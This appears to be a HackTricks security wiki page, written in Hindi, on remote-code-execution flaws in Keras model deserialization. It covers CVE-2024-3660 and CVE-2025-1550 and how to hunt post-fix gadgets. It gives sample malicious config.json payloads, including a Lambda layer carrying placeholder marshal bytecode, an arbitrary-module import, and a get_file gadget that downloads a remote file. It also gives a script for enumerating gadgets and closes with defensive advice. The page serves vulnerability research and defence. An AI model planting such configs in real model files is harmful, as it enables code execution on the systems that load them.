# Keras Model Deserialization RCE और Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

यह पृष्ठ Keras मॉडल डेसिरियलाइजेशन पाइपलाइन के खिलाफ व्यावहारिक शोषण तकनीकों का सारांश प्रस्तुत करता है, मूल .keras प्रारूप के आंतरिक और हमले की सतह को समझाता है, और मॉडल फ़ाइल कमजोरियों (MFVs) और पोस्ट-फिक्स गैजेट्स खोजने के लिए एक शोधकर्ता टूलकिट प्रदान करता है।

## .keras मॉडल प्रारूप आंतरिक

एक .keras फ़ाइल एक ZIP संग्रह है जिसमें कम से कम शामिल हैं:
- metadata.json – सामान्य जानकारी (जैसे, Keras संस्करण)
- config.json – मॉडल आर्किटेक्चर (प्राथमिक हमले की सतह)
- model.weights.h5 – HDF5 में वजन

config.json पुनरावृत्त डेसिरियलाइजेशन को संचालित करता है: Keras मॉड्यूल आयात करता है, कक्षाओं/कार्यक्रमों को हल करता है और हमलावर-नियंत्रित शब्दकोशों से परतों/वस्तुओं का पुनर्निर्माण करता है।

Dense परत वस्तु के लिए उदाहरण स्निपेट:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialization performs:
- मॉड्यूल आयात और मॉड्यूल/क्लास_नाम कुंजी से प्रतीक समाधान
- from_config(...) या हमलावर-नियंत्रित kwargs के साथ कंस्ट्रक्टर का आह्वान
- नेस्टेड ऑब्जेक्ट्स (एक्टिवेशन, इनिशियलाइज़र, प्रतिबंध, आदि) में पुनरावृत्ति

ऐतिहासिक रूप से, इसने config.json तैयार करने वाले हमलावर के लिए तीन प्राइमिटिव्स को उजागर किया:
- यह नियंत्रित करना कि कौन से मॉड्यूल आयात किए जाते हैं
- यह नियंत्रित करना कि कौन से क्लास/फंक्शन हल किए जाते हैं
- यह नियंत्रित करना कि कंस्ट्रक्टर/ from_config में कौन से kwargs पास किए जाते हैं

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Lambda.from_config() ने python_utils.func_load(...) का उपयोग किया जो हमलावर बाइट्स पर base64-डिकोड करता है और marshal.loads() को कॉल करता है; Python unmarshalling कोड निष्पादित कर सकता है।

Exploit idea (config.json में सरलित पेलोड):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras डिफ़ॉल्ट रूप से safe_mode=True लागू करता है। Lambda में सीरियलाइज्ड Python फ़ंक्शन को ब्लॉक किया गया है जब तक कि उपयोगकर्ता स्पष्ट रूप से safe_mode=False के साथ ऑप्ट आउट नहीं करता।

Notes:
- विरासती प्रारूप (पुराने HDF5 सहेजने) या पुराने कोडबेस आधुनिक जांचों को लागू नहीं कर सकते, इसलिए "डाउनग्रेड" शैली के हमले तब भी लागू हो सकते हैं जब पीड़ित पुराने लोडर्स का उपयोग करते हैं।

## CVE-2025-1550 – Keras ≤ 3.8 में मनमाना मॉड्यूल आयात

Root cause:
- _retrieve_class_or_fn ने config.json से हमलावर-नियंत्रित मॉड्यूल स्ट्रिंग्स के साथ unrestricted importlib.import_module() का उपयोग किया।
- प्रभाव: किसी भी स्थापित मॉड्यूल (या sys.path पर हमलावर-रोपित मॉड्यूल) का मनमाना आयात। आयात-समय कोड चलता है, फिर ऑब्जेक्ट निर्माण हमलावर kwargs के साथ होता है।

Exploit idea:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
सुरक्षा सुधार (Keras ≥ 3.9):
- मॉड्यूल अनुमति सूची: आधिकारिक पारिस्थितिकी तंत्र मॉड्यूल: keras, keras_hub, keras_cv, keras_nlp तक सीमित आयात
- सुरक्षित मोड डिफ़ॉल्ट: safe_mode=True असुरक्षित Lambda सीरियलाइज्ड-फंक्शन लोडिंग को ब्लॉक करता है
- बुनियादी प्रकार की जांच: डेसिरियलाइज्ड ऑब्जेक्ट्स को अपेक्षित प्रकारों से मेल खाना चाहिए

## अनुमति सूची के भीतर पोस्ट-फिक्स गैजेट सतह

अनुमति सूची और सुरक्षित मोड के साथ भी, अनुमत Keras कॉल करने योग्य के बीच एक व्यापक सतह बनी रहती है। उदाहरण के लिए, keras.utils.get_file मनचाहे URL को उपयोगकर्ता-चयन योग्य स्थानों पर डाउनलोड कर सकता है।

Lambda के माध्यम से गैजेट जो एक अनुमत फ़ंक्शन को संदर्भित करता है (सीरियलाइज्ड Python बाइटकोड नहीं):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
महत्वपूर्ण सीमा:
- Lambda.call() लक्षित कॉल करने योग्य को कॉल करते समय इनपुट टेन्सर को पहले स्थिति तर्क के रूप में जोड़ता है। चुने गए गैजेट्स को अतिरिक्त स्थिति तर्क सहन करना चाहिए (या *args/**kwargs स्वीकार करना चाहिए)। यह उन कार्यों को सीमित करता है जो व्यवहार्य हैं।

अनुमत गैजेट्स के संभावित प्रभाव:
- मनमाना डाउनलोड/लेखन (पथ प्लांटिंग, कॉन्फ़िगरेशन विषाक्तता)
- नेटवर्क कॉलबैक/SSRF-जैसे प्रभाव वातावरण के आधार पर
- यदि लिखे गए पथ बाद में आयात/निष्पादित किए जाते हैं या PYTHONPATH में जोड़े जाते हैं, या यदि एक लिखने योग्य निष्पादन-पर-लेखन स्थान मौजूद है तो कोड निष्पादन के लिए श्रृंखला बनाना

## शोधकर्ता उपकरण किट

1) अनुमत मॉड्यूल में प्रणालीबद्ध गैजेट खोज

keras, keras_nlp, keras_cv, keras_hub में उम्मीदवार कॉल करने योग्य की गणना करें और उन पर ध्यान केंद्रित करें जिनमें फ़ाइल/नेटवर्क/प्रक्रिया/पर्यावरण साइड इफेक्ट्स हैं।
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) डायरेक्ट डेसिरियलाइजेशन परीक्षण (कोई .keras आर्काइव की आवश्यकता नहीं)

Keras डेसिरियलाइजर्स में तैयार किए गए डिक्ट्स को सीधे फीड करें ताकि स्वीकृत पैरामीटर सीखे जा सकें और साइड इफेक्ट्स का अवलोकन किया जा सके।
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) क्रॉस-वर्जन प्रोबिंग और फॉर्मेट्स

Keras विभिन्न कोडबेस/युगों में विभिन्न गार्डरेल्स और फॉर्मेट्स के साथ मौजूद है:
- TensorFlow बिल्ट-इन Keras: tensorflow/python/keras (विरासत, हटाने के लिए निर्धारित)
- tf-keras: अलग से बनाए रखा गया
- मल्टी-बैकेंड Keras 3 (आधिकारिक): मूल .keras पेश किया गया

कोडबेस और फॉर्मेट्स (.keras बनाम विरासत HDF5) के बीच परीक्षण दोहराएं ताकि रिग्रेशन या गायब गार्ड्स का पता लगाया जा सके।

## डिफेंसिव सिफारिशें

- मॉडल फ़ाइलों को अविश्वसनीय इनपुट के रूप में मानें। केवल विश्वसनीय स्रोतों से मॉडल लोड करें।
- Keras को अद्यतित रखें; allowlisting और प्रकार जांच के लाभ के लिए Keras ≥ 3.9 का उपयोग करें।
- जब तक आप फ़ाइल पर पूरी तरह से भरोसा न करें, तब तक मॉडल लोड करते समय safe_mode=False न सेट करें।
- विचार करें कि डेसिरियलाइजेशन को एक सैंडबॉक्स, कम-से-कम विशेषाधिकार वाले वातावरण में चलाया जाए जिसमें नेटवर्क एग्रेस न हो और फ़ाइल सिस्टम तक सीमित पहुंच हो।
- जहां संभव हो, मॉडल स्रोतों और अखंडता जांच के लिए allowlists/हस्ताक्षर लागू करें।

## संदर्भ

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)

{{#include ../../banners/hacktricks-training.md}}
